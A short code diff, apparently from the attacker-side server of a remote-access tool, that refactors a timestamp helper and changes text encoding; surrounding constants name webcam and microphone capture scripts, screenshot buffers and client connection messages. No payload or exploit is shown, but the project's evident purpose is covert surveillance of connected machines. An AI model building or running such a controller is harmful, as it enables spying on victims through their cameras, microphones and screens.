@@ -1,13 +1,14 @@
 import asyncore
 import os
 import threading
-import datetime
+
+from src.attacker.util import ts
 
 CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
 
 BUFFER_SNAPSHOT = 609600
 BUFFER_DEFAULT = 8096
-ENCODING = "Cp1252"
+ENCODING = "utf-8"
 
 WEBCAM_SCRIPT = "wb.py"
 MICROPHONE_SCRIPT = "mic.py"
@@ -26,8 +27,6 @@ DATA_START_AUDIOSTREAM = "VA"
 CONNECTION_DISCONNECT_TEMPLATE = "[{time}] Client {addr} disconnected"
 CONNECTION_LOST_TEMPLATE = "[{time}] Client {addr} lost connection"
 
-def ts():
-    return datetime.datetime.now().strftime("%H:%M:%S")
 
 class ConnectionHandler(asyncore.dispatcher_with_send):
     receiving_screenshot = False
